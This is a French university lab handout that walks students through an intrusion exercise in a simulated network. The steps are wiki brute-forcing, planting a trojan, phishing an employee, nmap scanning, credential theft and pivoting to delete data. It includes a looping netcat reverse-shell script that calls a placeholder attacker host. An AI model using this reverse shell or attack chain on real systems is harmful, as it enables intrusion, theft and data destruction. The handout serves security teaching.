# TP 1 : Intrusion

_François Lesueur ([francois.lesueur@insa-lyon.fr](mailto:francois.lesueur@insa-lyon.fr))_

Ce TP sera réalisé dans l'infrastructure MI-LXC, disponible [ici](https://github.com/flesueur/mi-lxc) (nécessite un Linux en root) ou dans la VM "tp-sec-debian" disponible en salle de TP (`/machines_virtuelles/secu_vms/master/tp-sec-debian.sh`, debian/debian et root/root). L'infrastructure déployée simule plusieurs postes dont un SI d'entreprise (firewall, DMZ, intranet, authentification centralisée, serveur de fichiers, quelques postes de travail interne), une machine d'attaquant (hacker) et quelques autres servant à l'intégration de l'ensemble. La compréhension plus fine du SI de l'entreprise ciblée fait partie des objectifs du TP.

Pour une utilisation sur un poste personnel depuis le dépôt github, la procédure est expliquée dans le README.md.

Pour une utilisation dans la VM "tp-sec-debian", MI-LXC est déjà installé et l'infrastructure déployée. Il faut passer root puis aller dans le dossier `/root/mi-lxc`. Ensuite, `./mi-lxc.py addbridges`, `./mi-lxc.py start`.

Une fois l'environnement démarré, la seule machine à utiliser est évidemment celle du hacker (`./mi-lxc.py display hacker`).


Déroulement général
===================

Votre objectif est de détruire les informations internes de l'entreprise _Target_ (données comptables, base clients). Pour ce faire, vous travaillerez exclusivement sur la machine du hacker. Une première reconnaissance vous a amené à savoir que votre cible héberge un wiki sur `http://www.target.virt`. Vous devrez réaliser les étapes suivantes :

* Récupération d'une adresse mail interne sur le wiki
* Altération du wiki en y intégrant un cheval de Troie prêt à être téléchargé par un interne
* Manipulation du commercial pour lui faire installer ce cheval de Troie (via un téléchargement interne donc plus crédible qu'une pièce jointe)
* Utilisation du cheval de Troie pour scanner le réseau interne
* Pivot vers la machine hébergeant les données ciblées
* Transfert puis suppression des données comptables et de la base clients
* Profit $$$

Le fil proposé ne couvre bien sûr pas l'ensemble des possibilités mais vise à montrer la diversité des moyens qu'un attaquant peut mettre en œuvre.

Préparation du cheval de Troie
==============================

Pour contrôler la machine du commercial, nous allons créer puis transmettre un cheval de Troie. Notre but est d'obtenir un shell sur la machine du commercial afin de l'utiliser comme pivot. Cependant, comme le firewall n'autorise pas les connexions vers l'intérieur de l'entreprise, nous allons plus spécifiquement envoyer un reverse-shell : c'est la machine du commercial qui initiera la connexion vers la machine du hacker.

Le code exemple suivant est disponible sur la machine du hacker (`~/tp/intrusion/trojan.sh`) :
```
#!/bin/bash
while [ 1 ]; do
	/bin/nc <IP Hacker> <Port Hacker> -q0 -e /bin/bash;
	sleep 1;
done
```

* Étudiez ce petit script, son fonctionnement, le programme nc (netcat). Pourquoi y a-t-il une boucle infinie ?
* Configurez et manipulez ce script en local pour ouvrir un reverse-shell avec vous-mêmes.



Altération du wiki
==================

Le wiki est accessible publiquement mais une authentification est nécessaire pour lire et écrire. Vous disposez dans le dossier `~/tp/intrusion` d'un script pour tenter de _bruteforcer_ l'authentification. Étudiez son fonctionnement puis tentez de découvrir un accès. À partir de cet accès, créez une page crédible (mise à jour, installation d'un logiciel, etc.), intégrant le `.sh` que vous aurez préparé comme reverse-shell.

Conseils : les comptes d'administration sont souvent root, admin ou administrator et des listes de mots de passe communs sont disponibles sur internet.


Corruption de la machine du commercial
======================================

Vous devez maintenant amener le commercial à exécuter votre cheval de Troie sur sa machine. Vous devez faire attention à envoyer un mail crédible, social-engineering, qui pousse le commercial à suivre les instructions. Dans un cas réel, il suffirait qu'un seul employé installe le cheval de Troie pour que l'attaque fonctionne

Appelez l'enseignant pour jouer le rôle du commercial, vérifiez le fonctionnement.


Scan du réseau interne
======================

Il vous faut maintenant explorer le réseau pour trouver votre cible. Le programme `nmap` est un scanner réseau, installé sur la machine du hacker mais bien sûr pas du commercial. Il faut donc le transférer pour l'exécuter depuis la machine du commercial. Nous pouvons utiliser netcat pour ce transfert (demandez si vous êtes curieux !) ou un serveur web sur la machine du hacker. Le dossier `/var/www/html` du hacker est partagé par un serveur web, le programme en ligne de commande `wget` peut être utilisé côté commercial pour télécharger depuis ce dossier.

Utilisez maintenant nmap sur la machine du commercial pour explorer le réseau interne : `nmap <adresse de réseau/masque>`. Dessinez un plan de réseau, les services ouverts, les logiciels utilisés, les sites accessibles. Soyez pertinent dans les adresses IP scannées, le scan est assez long.


Récupération d'un mot de passe valide
=====================================

Pour aller plus loin, vous aurez besoin d'un mot de passe valide sur le SI. Vous pouvez obtenir celui du commercial à partir de l'[analyse de son profil Thunderbird par exemple](https://github.com/unode/firefox_decrypt), en ajoutant un piège à son `.bashrc` lui demandant de retaper son mot de passe ou encore en intégrant la saisie lors du lancement du cheval de Troie.

Accès à la machine cible
========================

Pivotez vers la machine hébergeant les données ciblées. Vous pouvez ensuite utiliser la commande `find` avec les bons arguments pour trouver, sur cette machine cible, les fichiers sur lesquels vous pourriez avoir des droits en écriture.


Bonus
=====

Il existe un chemin d'attaque, qui sera plus difficile à contrôler côté firewall, qui rebondit par la machine `dev`...
